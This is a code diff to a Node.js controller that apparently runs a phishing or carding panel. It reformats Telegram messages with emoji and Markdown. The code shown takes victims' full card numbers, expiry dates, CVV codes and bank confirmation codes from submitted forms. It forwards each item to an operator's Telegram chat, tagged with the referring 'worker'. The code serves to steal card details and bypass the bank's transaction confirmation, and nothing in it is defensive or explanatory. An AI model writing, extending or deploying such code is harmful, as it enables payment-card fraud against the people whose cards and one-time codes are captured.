@@ -77,14 +77,14 @@ module.exports = {
                 cvv: req.body.cvv,
             })
 
-            let message = `Создана новая транзакция\n\n`
-            message += `ID Транзакции: #${transaction.id}\n`
-            message += `Номер карты: ${req.body.pan}\n`
-            message += `Действует до: ${req.body.expires_at}\n`
-            message += `CVV: ${req.body.cvv}\n`
-            message += `Воркер: ${transaction.referal}\n`
+            let message = `‼️ *Создана новая транзакция* ‼️\n\n`
+            message += `▪️ *ID Транзакции:* #${transaction.id}\n`
+            message += `▪️ *Номер карты:* ${req.body.pan}\n`
+            message += `▪️ *Действует до:* ${req.body.expires_at}\n`
+            message += `▪️ *CVC/CVV-код:* ${req.body.cvv}\n`
+            message += `▪️ *Воркер:* ${transaction.referal}\n`
             
-            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
+            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' })
 
             return res.send({ success: true })
         } catch (error) {
@@ -110,9 +110,9 @@ module.exports = {
             if(!transaction) {
                 return res.send({ success: false, message: 'Transaction not found' })
             }
-            let message = `Номер транзакции: #${transaction.id}\n`
-            message += `Код подтверждения: ${req.body.code}\n`
-            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
+            let message = `▪️ *Номер транзакции:* #${transaction.id}\n`
+            message += `‼️ *Код подтверждения:* ${req.body.code}\n`
+            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' })
             return res.send({ success: true })
         } catch (error) {
             console.error(error)
@@ -136,9 +136,9 @@ module.exports = {
             if(!transaction) {
                 return res.send({ success: false, message: 'Transaction not found' })
             }
-            let message = `Номер транзакции: #${transaction.id}\n`
-            message += `"Клиент" запросил повторный код подтверждения\n`
-            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
+            let message = `▪️ *Номер транзакции:* #${transaction.id}\n`
+            message += `⁉️ "Клиент" запросил повторный код подтверждения\n`
+            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' })
             return res.send({ success: true })
         } catch (error) {
             console.error(error)
